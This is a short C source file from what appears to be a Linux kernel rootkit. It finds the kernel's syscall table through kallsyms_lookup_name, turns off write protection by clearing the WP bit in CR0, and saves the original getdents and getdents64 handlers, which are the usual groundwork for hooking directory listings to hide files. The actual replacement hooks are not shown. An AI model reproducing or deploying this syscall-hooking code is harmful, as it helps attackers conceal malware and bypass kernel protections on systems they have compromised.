#include <linux/kallsyms.h>

#include "hook.h"


void **sys_calls;

asmlinkage long (*sys_getdents)(unsigned, struct linux_dirent *, unsigned);
asmlinkage long (*sys_getdents64)(unsigned, struct linux_dirent64 *, unsigned);


int
retrieve_sys_call_table(void)
{
    return NULL == (sys_calls
        = (void **)kallsyms_lookup_name("sys_call_table"));
}

void
init_hooks(void)
{
    disable_protection();

    sys_getdents = (void *)sys_calls[__NR_getdents];
    sys_getdents64 = (void *)sys_calls[__NR_getdents64];

    enable_protection();
}

void
disable_protection(void)
{
    write_cr0(read_cr0() & (~0x10000));
}

void
enable_protection(void)
{
    write_cr0(read_cr0() | 0x10000);
}
